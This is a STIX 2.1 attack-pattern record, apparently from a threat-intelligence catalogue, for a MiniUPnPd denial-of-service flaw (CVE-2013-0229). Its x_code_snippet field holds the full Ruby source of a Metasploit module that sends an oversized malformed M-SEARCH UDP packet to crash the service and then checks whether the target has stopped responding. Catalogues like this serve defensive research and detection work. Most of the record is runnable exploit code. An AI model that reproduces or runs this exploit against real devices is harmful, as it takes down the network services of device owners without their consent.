{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8898269d-013c-471c-9bc2-629ada4bbf02",
    "created": "2024-08-14T16:25:05.008094Z",
    "modified": "2024-08-14T16:25:05.008098Z",
    "name": "MiniUPnPd 1.4 Denial of Service (DoS) Exploit",
    "description": " This module allows remote attackers to cause a denial of service (DoS) in MiniUPnP 1.0 server via a specifically crafted UDP request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/upnp/miniupnpd_dos.rb",
            "external_id": "miniupnpd_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0229"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play/"
        },
        {
            "source_name": "reference",
            "url": "https://www.hdm.io/writing/SecurityFlawsUPnP.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MiniUPnPd 1.4 Denial of Service (DoS) Exploit',\n      'Description'    => %q{\n          This module allows remote attackers to cause a denial of service (DoS)\n          in MiniUPnP 1.0 server via a specifically crafted UDP request.\n      },\n      'Author'         =>\n        [\n          'hdm', # Vulnerability discovery\n          'Dejan Lukan' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-0229' ],\n          [ 'OSVDB', '89625' ],\n          [ 'BID', '57607' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play/' ],\n          [ 'URL', 'https://www.hdm.io/writing/SecurityFlawsUPnP.pdf' ]\n        ],\n      'DisclosureDate' => '2013-03-27',\n    ))\n\n    register_options(\n    [\n      Opt::RPORT(1900),\n      OptInt.new('ATTEMPTS', [true, 'Max number of attempts to DoS the remote MiniUPnP ending', 3 ])\n    ])\n  end\n\n  def send_probe(udp_sock, probe)\n    udp_sock.put(probe)\n    data = udp_sock.recvfrom\n    if data and not data[0].empty?\n      return data[0]\n    else\n      return nil\n    end\n  end\n\n  def run\n    # the M-SEARCH probe packet that tries to identify whether the service is up or not\n    msearch_probe = \"M-SEARCH * HTTP/1.1\\r\\n\"\n    msearch_probe << \"Host:239.255.255.250:1900\\r\\n\"\n    msearch_probe << \"ST:upnp:rootdevice\\r\\n\"\n    msearch_probe << \"Man:\\\"ssdp:discover\\\"\\r\\n\"\n    msearch_probe << \"MX:3\\r\\n\"\n    msearch_probe << \"\\r\\n\"\n\n    # the M-SEARCH packet that is being read line by line: there shouldn't be CRLF after the\n    # ST line\n    sploit = \"M-SEARCH * HTTP/1.1\\r\\n\"\n    sploit << \"HOST: 239.255.255.250:1900\\r\\n\"\n    sploit << \"ST:uuid:schemas:device:MX:3\"\n    # the packet can be at most 1500 bytes long, so add appropriate number of ' ' or '\\t'\n    # this makes the DoS exploit more probable, since we're occupying the stack with arbitrary\n    # characters: there's more chance that the program will run off the stack.\n    sploit += ' '*(1500-sploit.length)\n\n\n    # connect to the UDP port\n    connect_udp\n\n    print_status(\"#{rhost}:#{rport} - Checking UPnP...\")\n    response = send_probe(udp_sock, msearch_probe)\n    if response.nil?\n      print_error(\"#{rhost}:#{rport} - UPnP end not found\")\n      disconnect_udp\n      return\n    end\n\n    (1..datastore['ATTEMPTS']).each { |attempt|\n      print_status(\"#{rhost}:#{rport} - UPnP DoS attempt #{attempt}...\")\n\n      # send the exploit to the target\n      print_status(\"#{rhost}:#{rport} - Sending malformed packet...\")\n      udp_sock.put(sploit)\n\n      # send the probe to the target\n      print_status(\"#{rhost}:#{rport} - The target should be unresponsive now...\")\n      response = send_probe(udp_sock, msearch_probe)\n      if response.nil?\n        print_good(\"#{rhost}:#{rport} - UPnP unresponsive\")\n        disconnect_udp\n        return\n      else\n        print_status(\"#{rhost}:#{rport} - UPnP is responsive still\")\n      end\n    }\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-27"
}